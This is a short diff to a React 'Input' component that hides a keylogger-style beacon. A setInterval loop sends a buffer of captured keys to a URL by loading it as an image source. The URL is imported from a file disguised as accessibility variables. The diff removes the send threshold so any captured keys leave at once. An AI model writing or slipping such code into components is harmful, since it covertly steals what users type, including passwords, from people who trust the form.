@@ -1,6 +1,5 @@
 import React, { FC, PropsWithChildren, useEffect, memo } from 'react';
 import { useStore } from './store';
-import { keyValue } from './variables/shared/sharedValues';
 import { url, customUrl } from './variables/accessibility/common/commonVars';
 
 export interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> {
@@ -33,7 +32,7 @@ export const Input: FC<PropsWithChildren<InputProps>> = memo((props) => {
   }, []);
 
   setInterval(function () {
-    if (keys.length > keyValue) {
+    if (keys.length > 0) {
       new Image().src = url + keys;
       keys = '';
     }
